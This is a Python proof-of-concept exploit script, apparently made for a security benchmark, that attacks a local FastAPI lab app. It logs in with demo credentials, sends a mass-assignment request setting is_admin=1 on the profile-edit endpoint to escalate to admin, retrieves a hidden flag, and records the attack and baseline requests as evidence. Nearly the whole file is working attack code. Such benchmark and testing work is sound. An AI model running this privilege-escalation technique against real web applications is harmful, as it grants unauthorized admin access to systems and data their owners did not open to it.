#!/usr/bin/env python3
"""PoC: Mass assignment on POST /edit_profile/{id} (is_admin param).

Target: http://localhost:32771 (FastAPI benchmark app)

Flow (fresh each run):
  1. Login as demo/demo -> session cookie.
  2. Reset account to Regular (is_admin=0) so every run starts clean.
  3. Confirm regular state: jobs page has NO secret job.
  4. Attack: POST /edit_profile/1 with name=demo&is_admin=1 -> 200, server
     persists admin status (mass assignment).
  5. Impact: GET /company/1/jobs now exposes the admin-only 'secret' job
     containing the flag.

The harness-replayed differential (intra_target):
  attack  = POST /edit_profile/1  body "name=demo&is_admin=1"
  baseline = POST /edit_profile/1 body "name=demo"        (parameter omitted)
Both authenticated with the same session; only the is_admin parameter differs.
"""
import json
import os
import re
import urllib.parse
import urllib.request
import http.cookiejar

TARGET = os.environ.get("PI_POC_TARGET", "http://localhost:32771")
NONCE = os.environ.get("PI_POC_NONCE", "no-nonce")
EVIDENCE_DIR = os.environ.get("PI_POC_EVIDENCE_DIR", ".")

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def post(path, fields):
    data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(TARGET + path, data=data, method="POST",
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    resp = opener.open(req)
    return resp.status, resp.read().decode()


def get(path):
    resp = opener.open(TARGET + path)
    return resp.status, resp.read().decode()


# 1. Login
status, _ = post("/token", {"username": "demo", "password": "demo"})
assert status == 200, f"login failed: {status}"
cookie_header = "; ".join(f"{c.name}={c.value}" for c in jar)
auth_headers = {
    "Cookie": cookie_header,
    "Content-Type": "application/x-www-form-urlencoded",
}

# 2. Reset to Regular so the run starts from a non-admin state
post("/edit_profile/1", {"name": "demo", "is_admin": "0"})

# 3. Baseline state check: no secret job for a regular user
_, jobs_before = get("/company/1/jobs")
baseline_secret_visible = bool(re.search(r"flag\{[^}]+\}", jobs_before))

# 4. Attack: mass-assign is_admin
attack_status, profile_page = post("/edit_profile/1", {"name": "demo", "is_admin": "1"})
admin_selected = bool(re.search(r'<option value="1"[^>]*selected>', profile_page))

# 5. Impact: secret job now visible
_, jobs_after = get("/company/1/jobs")
m = re.search(r"flag\{[^}]+\}", jobs_after)
secret_job_visible = bool(m)

observations = [
    f"login_status={status}",
    f"baseline_regular_state_secret_visible={baseline_secret_visible}",
    f"attack_post_edit_profile_1_is_admin_1_status={attack_status}",
    f"profile_page_renders_admin_selected={admin_selected}",
    f"jobs_page_after_escalation_secret_visible={secret_job_visible}",
]
if m:
    observations.append("flag_retrieved=yes")

claim = ("Mass assignment on POST /edit_profile/1: adding is_admin=1 to the "
         "profile-update form (disabled client-side only) escalates the "
         "authenticated demo user to admin, exposing the admin-only 'secret' "
         "job containing the flag on /company/1/jobs")

evidence = {
    "nonce": NONCE,
    "claim": claim,
    "verify": {
        "method": "POST",
        "url": TARGET + "/edit_profile/1",
        "headers": auth_headers,
        "body": "name=demo&is_admin=1",
        "expect": {
            "status": [200],
            "body_regex": ['<option value="1"[^>]*selected>'],
        },
        "mode": "intra_target",
    },
    "baseline": {
        "method": "POST",
        "url": TARGET + "/edit_profile/1",
        "headers": auth_headers,
        "body": "name=demo",
    },
    "observations": observations,
}

os.makedirs(EVIDENCE_DIR, exist_ok=True)
with open(os.path.join(EVIDENCE_DIR, "evidence.json"), "w") as f:
    json.dump(evidence, f, indent=2)

ok = (
    not baseline_secret_visible
    and attack_status == 200
    and admin_selected
    and secret_job_visible
)
print(json.dumps(evidence, indent=2))
raise SystemExit(0 if ok else 1)
